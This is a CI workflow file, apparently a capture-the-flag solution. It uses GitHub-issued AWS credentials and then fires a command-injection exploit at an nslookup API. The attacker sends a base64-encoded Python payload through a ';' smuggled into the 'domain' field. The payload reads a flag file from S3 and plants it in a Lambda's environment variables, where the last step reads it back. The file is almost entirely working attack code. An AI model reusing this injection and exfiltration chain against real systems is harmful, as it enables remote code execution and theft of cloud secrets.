name: deploy
on:
  push:
    branches:
      - corgi
jobs:
  aws:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      contents: read
    steps:
      - name: Get AWS credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: AWS identity
        run: aws sts get-caller-identity

      - name: Inject Python exploit via base64 pipe
        run: |
          B64=$(printf '%s\n' \
            'import boto3' \
            's3 = boto3.client("s3")' \
            'flag = s3.get_object(Bucket="codec4f26c862a321ef5", Key="flag.txt")["Body"].read().decode()' \
            'lmb = boto3.client("lambda", region_name="us-east-1")' \
            'lmb.update_function_configuration(FunctionName="nslookupv2", Environment={"Variables": {"FLAG": flag}})' \
            | base64 -w 0)
          echo "encoded: $B64"
          curl -s -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
            -H "Content-Type: application/json" \
            -d "{\"domain\":\";echo $B64 | base64 -d | python3 2>&1\"}"

      - name: Wait for Lambda execution
        run: sleep 10

      - name: Read FLAG from Lambda env vars
        run: |
          echo "===== env vars ====="
          aws lambda get-function-configuration \
            --function-name nslookupv2 \
            --region us-east-1 \
            --query 'Environment.Variables' || true
